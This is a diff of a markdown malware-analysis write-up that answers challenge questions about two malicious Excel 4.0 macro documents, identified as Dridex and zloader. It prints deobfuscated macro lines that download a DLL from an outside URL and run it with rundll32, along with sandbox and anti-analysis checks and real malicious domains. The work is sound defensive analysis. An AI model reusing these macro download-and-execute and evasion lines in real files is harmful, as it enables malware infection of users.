@@ -6,12 +6,12 @@ pagination_prev: null
 
 
 ## Q1. Sample1: What is the document decryption password?
-- Using `msoffcrypto-crack.py` we can recover the password of encrypted MS Office documents.
+Using `msoffcrypto-crack.py` we can recover the password of encrypted MS Office documents.
 ```
 $ msoffcrypto-crack.py sample1-fb5ed444ddc37d748639f624397cff2a.bin
 Password found: VelvetSweatshop
 ```
-## Answer
+### Answer
 ```
 VelvetSweatshop
 ```
@@ -20,7 +20,7 @@ VelvetSweatshop
 
 
 ## Q2. Sample1: This document contains six hidden sheets. What are their names? Provide the value of the one starting with S.
-- Let's look at the file metadata using `exiftool`.
+Let's look at the file metadata using `exiftool`.
 ```
 $ exiftool sample1-fb5ed444ddc37d748639f624397cff2a.bin 
 ExifTool Version Number         : 12.42
@@ -51,12 +51,12 @@ Hyperlinks Changed              : No
 Title Of Parts                  : Sheet1, Sheet2, Sheet3, SOCWNEScLLxkLhtJp, OHqYbvYcqmWjJJjsF, Macro2, Macro3, Macro4, Macro5
 Heading Pairs                   : Worksheets, 3, Excel 4.0 Macros, 6
 ```
-- In the `Title Of Parts` field we can see that there is only one starting with a S.
+In the `Title Of Parts` field we can see that there is only one starting with a S.
 
 ```
 oledump.py sample1 -p plugin_biff.py --pluginoptions '-x' | grep "hidden"
 ```
-## Answer
+### Answer
 ```
 SOCWNEScLLxkLhtJp
 ```
@@ -65,7 +65,7 @@ SOCWNEScLLxkLhtJp
 
 
 ## Q3. Sample1: What URL is the malware using to download the next stage? Only include the second-level and top-level domain. For example, xyz.com.
-- We can use `olevba` for this task.
+We can use `olevba` for this task.
 ```
 $ olevba sample1-fb5ed444ddc37d748639f624397cff2a.bin 
 
@@ -99,7 +99,7 @@ $ olevba sample1-fb5ed444ddc37d748639f624397cff2a.bin
 |          |                    |code                                         |
 +----------+--------------------+---------------------------------------------+
 ```
-## Answer
+### Answer
 ```
 http://rilaer.com
 ```
@@ -108,20 +108,20 @@ http://rilaer.com
 
 
 ## Q4. Sample1: What malware family was this document attempting to drop?
-- Before we do anything, we need to find the MD5 hash of the file.
+Before we do anything, we need to find the MD5 hash of the file.
 ```
 $ md5sum sample1-fb5ed444ddc37d748639f624397cff2a.bin 
 fb5ed444ddc37d748639f624397cff2a  sample1-fb5ed444ddc37d748639f624397cff2a.bin
 ```
-- Let's look up the hash in Malware bazaar
+Let's look up the hash in Malware bazaar
 
 ![xls 4](https://github.com/Knign/Write-ups/assets/110326359/80042e67-e464-4fec-b2dd-9143d71d143a)
 
-- We can also look up the hash in VirusTotal.
+We can also look up the hash in VirusTotal.
 
 ![xls 4 2](https://github.com/Knign/Write-ups/assets/110326359/56cbadb0-9d7f-4c25-a1b8-df7349278143)
 
-## Answer
+### Answer
 ```
 Dridex
 ```
@@ -130,7 +130,7 @@ Dridex
 
 
 ## Q5. Sample2: This document has a very hidden sheet. What is the name of this sheet?
-- Let's use `exiftool` as before in order to find the sheets contained in the file.
+Let's use `exiftool` as before in order to find the sheets contained in the file.
 ```
 $ exiftool sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin 
 ExifTool Version Number         : 12.42
@@ -161,8 +161,9 @@ Hyperlinks Changed              : No
 Title Of Parts                  : Sheet1
 Heading Pairs                   : Worksheets, 1
 ```
-- Unfortunately, `exiftool` does not give us the hidden sheets.
-- We have to use `olevba` to find the hidden sheet.
+Unfortunately, `exiftool` does not give us the hidden sheets.
+
+We have to use `olevba` to find the hidden sheet.
 ```
 $ olevba sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin
 XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
@@ -188,7 +189,7 @@ in file: xlm_macro - OLE stream: 'xlm_macro'
 ' CELL:H92, =CHAR(117.0), u
 --snip--;
 ```
-## Answer
+### Answer
 ```
 CSHykdYHvi
 ```
@@ -197,7 +198,7 @@ CSHykdYHvi
 
 
 ## Q6. Sample2: This document uses reg.exe. What registry key is it checking?
-- In the output of the previous command, we can find the registry key.
+In the output of the previous command, we can find the registry key.
 ```
 --snip--;
 ' CELL:CZ14, None, 
@@ -207,7 +208,7 @@ CSHykdYHvi
 "VBAWarnings"=dword:00000002
 --snip--;
 ```
-## Answer
+### Answer
 ```
 VBAWarnings
 ```
@@ -216,7 +217,7 @@ VBAWarnings
 
 
 ## Q7. Sample2: From the use of reg.exe, what value of the assessed key indicates a sandbox environment?
-- Using the `xmldeobfuscator` tool, we can decode unclear XLM macros.
+Using the `xmldeobfuscator` tool, we can decode unclear XLM macros.
 ```
 $ xlmdeobfuscator -f sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin
 XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
@@ -260,8 +261,8 @@ CELL:J732      , PartialEvaluation   , =FCLOSE(FOPEN("c:\users\public\1.reg",1))
 CELL:J733      , PartialEvaluation   , =FILE.DELETE("c:\users\public\1.reg")
 --snip--;
 ```
-- We can see the key specified as `1`.
-## Answer
+We can see the key specified as `1`.
+### Answer
 ```
 0x1
 ```
@@ -270,14 +271,14 @@ CELL:J733      , PartialEvaluation   , =FILE.DELETE("c:\users\public\1.reg")
 
 
 ## Q8. Sample2: This document performs several additional anti-analysis checks. What Excel 4 macro function does it use?
-- In the `xmldeobfuscator` output, we can see the check being performed using the `GET.WORKSPACE` function.
+In the `xmldeobfuscator` output, we can see the check being performed using the `GET.WORKSPACE` function.
 ```
 --snip--;
 CELL:K2        , FullEvaluation      , IF(GET.WORKSPACE(13)<770,CLOSE(FALSE),)
 CELL:K4        , FullEvaluation      , IF(GET.WORKSPACE(14)<381,CLOSE(FALSE),)
 --snip--;
 ```
-## Answer
+### Answer
 ```
 Get.Workspace
 ```
@@ -286,7 +287,7 @@ Get.Workspace
 
 
 ## Q9. Sample2: This document checks for the name of the environment in which Excel is running. What value is it using to compare?
-- In the output we can see the OS mentioned in  the `GET.WORKSPACE` command.
+In the output we can see the OS mentioned in  the `GET.WORKSPACE` command.
 ```
 --snip--;
 CELL:J6        , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1IF(ISNUMBER(SEARCH(""Windows"",GET.WORKSPACE(1))), ,CLOSE(TRUE))",K7)
@@ -296,7 +297,7 @@ CELL:J9        , FullEvaluation      , FORMULA("=CALL(""Shell32"",""ShellExecute
 CELL:J11       , FullEvaluation      , FORMULA("=SHARED FMLA at rowx=0 colx=1CLOSE(FALSE)",K12)
 --snip--;
 ```
-## Answer
+### Answer
 ```
 Windows
 ```
@@ -305,13 +306,13 @@ Windows
 
 
 ## Q10. Sample2: What type of payload is downloaded?
-- The process is opening a `rundll32.exe` file.
+The process is opening a `rundll32.exe` file.
 ```
 --snip--;
 CELL:J9        , FullEvaluation      , FORMULA("=CALL(""Shell32"",""ShellExecuteA"",""JJCCCJJ"",0,""open"",""C:\Windows\system32\rundll32.exe"",""c:\Users\Public\bmjn5ef.html,DllRegisterServer"",0,5)",K11)
 --snip--;
 ```
-## Answer
+### Answer
 ```
 DLL
 ```
@@ -320,13 +321,13 @@ DLL
 
 
 ## Q11. Sample2: What URL does the malware download the payload from?
-- Again the answer can be found in the output of the `xmldeobfuscator`.
+Again the answer can be found in the output of the `xmldeobfuscator`.
 ```
 --snip--;
 CELL:J7        , FullEvaluation      , FORMULA("=CALL(""urlmon"",""URLDownloadToFileA"",""JJCCJJ"",0,""https://ethelenecrace.xyz/fbb3"",""c:\Users\Public\bmjn5ef.html"",0,0)",K8)
 --snip--;
 ```
-## Answer
+### Answer
 ```
 https://ethelenecrace.xyz/fbb3
 ```
@@ -335,8 +336,8 @@ https://ethelenecrace.xyz/fbb3
 
 
 ## Q12. Sample2: What is the filename that the payload is saved as?
-- The answer lies in the previous snippet.
-## Answer
+The answer lies in the previous snippet.
+### Answer
 ```
 bmjn5ef.html
 ```
@@ -345,8 +346,8 @@ bmjn5ef.html
 
 
 ## Q13. Sample2: How is the payload executed? For example, mshta.exe
-- We can find the answer in in the same snippet as Q10 as the payload is first opened and then executed.
-## Answer
+We can find the answer in in the same snippet as Q10 as the payload is first opened and then executed.
+### Answer
 ```
 rundll32.exe
 ```
@@ -355,17 +356,17 @@ rundll32.exe
 
 
 ## Q14. Sample2: What was the malware family?
-- Use `md5sum` to obtain the file hash.
+Use `md5sum` to obtain the file hash.
 ```
 $ md5sum sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin 
 b5d469a07709b5ca6fee934b1e5e8e38  sample2-b5d469a07709b5ca6fee934b1e5e8e38.bin
 ```
- - Let's look up this hash in VirusTotal.
+Let's look up this hash in VirusTotal.
 
 ![xls 14](https://github.com/Knign/Write-ups/assets/110326359/31f314f8-8cff-4790-bf74-2dca9894b106)
 
-- The answer is the one listed by TrendMicro.
-## Answer
+The answer is the one listed by TrendMicro.
+### Answer
 ```
 zloader
 ```
